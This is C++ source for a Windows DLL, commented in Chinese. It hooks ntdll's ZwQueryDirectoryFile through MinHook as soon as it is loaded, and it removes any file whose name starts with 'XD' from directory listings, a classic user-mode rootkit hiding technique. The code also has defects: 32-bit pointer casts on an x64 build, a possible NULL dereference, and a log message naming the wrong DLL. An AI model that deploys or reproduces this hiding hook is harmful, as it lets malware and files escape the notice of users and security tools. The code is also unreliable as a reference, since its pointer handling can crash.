#include "pch.h"
#include "types.h"
#include <Windows.h>
#include "MinHook.h"
#include <fstream>
#include <stdio.h>
#include <winternl.h>

using namespace std;

#pragma comment(lib, "libMinHook.x64.lib")

int cnt = 0;
typedef NTSTATUS (WINAPI* ZWQUERYDIRECTORYFILE)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FileInformationClassEx FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
);
ZWQUERYDIRECTORYFILE fpZwQueryDirectoryFile = NULL;

// 將資訊寫入 debug.txt 檔案中
void DebugLog(wstring str) {
    wofstream file;
    file.open("C:\\debug.txt", std::wofstream::out | std::wofstream::app);
    if (file) file << str << endl << endl;
    file.close();
}

// 根據 FileInformationClass 回傳 FileInformation 的 FileName
WCHAR* GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
    switch (fileInformationClass)
    {
    case FileInformationClassEx::FileDirectoryInformation:
        return ((FileDirectoryInformationEx*)fileInformation)->FileName;
    case FileInformationClassEx::FileFullDirectoryInformation:
        return ((FileFullDirInformationEx*)fileInformation)->FileName;
    case FileInformationClassEx::FileIdFullDirectoryInformation:
        return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
    case FileInformationClassEx::FileBothDirectoryInformation:
        return ((FileBothDirInformationEx*)fileInformation)->FileName;
    case FileInformationClassEx::FileIdBothDirectoryInformation:
        return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
    case FileInformationClassEx::FileNamesInformation:
        return ((FileNamesInformationEx*)fileInformation)->FileName;
    default:
        return NULL;
    }
}

// 根據 FileInformationClass 回傳 FileInformation 的 NextEntryOffset
ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
    switch (fileInformationClass)
    {
    case FileInformationClassEx::FileDirectoryInformation:
        return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
    case FileInformationClassEx::FileFullDirectoryInformation:
        return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
    case FileInformationClassEx::FileIdFullDirectoryInformation:
        return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
    case FileInformationClassEx::FileBothDirectoryInformation:
        return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
    case FileInformationClassEx::FileIdBothDirectoryInformation:
        return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
    case FileInformationClassEx::FileNamesInformation:
        return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
    default:
        return 0;
    }
}

// 根據 FileInformationClass 設定 FileInformation 的 NextEntryOffset
void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass, ULONG value)
{
    switch (fileInformationClass)
    {
    case FileInformationClassEx::FileDirectoryInformation:
        ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
        break;
    case FileInformationClassEx::FileFullDirectoryInformation:
        ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
        break;
    case FileInformationClassEx::FileIdFullDirectoryInformation:
        ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
        break;
    case FileInformationClassEx::FileBothDirectoryInformation:
        ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
        break;
    case FileInformationClassEx::FileIdBothDirectoryInformation:
        ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
        break;
    case FileInformationClassEx::FileNamesInformation:
        ((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
        break;
    }
}

// 竄改原始的 ZwQueryDirectoryFile，隱藏檔名中有 "XD" 字串的檔案
NTSTATUS DetourZwQueryDirectoryFile(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FileInformationClassEx FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
) {
    // 1. 呼叫原本的 ZwQueryDirectoryFile，取得檔案結構
    NTSTATUS status = fpZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
    
    // 2. 確認是不是目標的 FileInformationClass
    if (NT_SUCCESS(status) && (FileInformationClass == FileInformationClassEx::FileDirectoryInformation || FileInformationClass == FileInformationClassEx::FileFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileNamesInformation)) {
        PVOID pCurrent = FileInformation;
        PVOID pPrevious = NULL;
        do {
            // 3. 透過檔名判斷是不是要隱藏的檔案
            if (wstring(GetFileDirEntryFileName(pCurrent, FileInformationClass)).find(L"XD") == 0) {
                // 4. 要隱藏的檔案，就把目前的 Entry 竄改成下一個 Entry
                ULONG nextEntryOffset = GetFileNextEntryOffset(pCurrent, FileInformationClass);
                if (nextEntryOffset != 0) {
                    int bytes = (DWORD)Length - ((ULONG)pCurrent - (ULONG)FileInformation) - nextEntryOffset;
                    RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + nextEntryOffset), (DWORD)bytes);
                }
                // 如果已經是最後一個檔案了，就把上一個 Entry 的 NextEntryOffset 改成 0
                else {
                    if (pCurrent == FileInformation)status = 0;
                    else SetFileNextEntryOffset(pPrevious, FileInformationClass, 0);
                    break;
                }
            }
            else {
                // 5. 不隱藏的檔案，就加上 NextEntryOffset 繼續判斷下一個檔案，直到 NextEntryOffset 等於 0 為止
                pPrevious = pCurrent;
                pCurrent = (BYTE*)pCurrent + GetFileNextEntryOffset(pCurrent, FileInformationClass);
            }
        } while (GetFileNextEntryOffset(pPrevious, FileInformationClass) != 0);
    }
    return status;
}

int hook() {
    wchar_t log[256];

    // 取得 ntdll.dll 的 handle
    HINSTANCE hDLL = LoadLibrary(L"ntdll.dll");
    if (!hDLL) {
        DebugLog(L"LoadLibrary wininet.dll failed\n");
        return 1;
    }

    // 從 ntdll.dll 找到 ZeQueryDirectoryFile
    void* ZwQueryDirectoryFile = (void*)GetProcAddress(hDLL, "ZwQueryDirectoryFile");
    if (!ZwQueryDirectoryFile) {
        DebugLog(L"GetProcAddress ZwQueryDirectoryFile failed\n");
        return 1;
    }

    // 用 Hook 把 ZwQueryDirectoryFile 竄改成我們定義的 DetourZwQueryDirectoryFile
    if (MH_Initialize() != MH_OK) {
        DebugLog(L"MH_Initialize failed\n");
        return 1;
    }
    int status = MH_CreateHook(ZwQueryDirectoryFile, &DetourZwQueryDirectoryFile, reinterpret_cast<LPVOID*>(&fpZwQueryDirectoryFile));
    if (status != MH_OK) {
        swprintf_s(log, L"MH_CreateHook failed: Error %d\n", status);
        DebugLog(log);
        return 1;
    }

    // 啟用 Hook
    status = MH_EnableHook(ZwQueryDirectoryFile);
    if (status != MH_OK) {
        swprintf_s(log, L"MH_EnableHook failed: Error %d\n", status);
        DebugLog(log);
        return 1;
    }

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        hook();
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}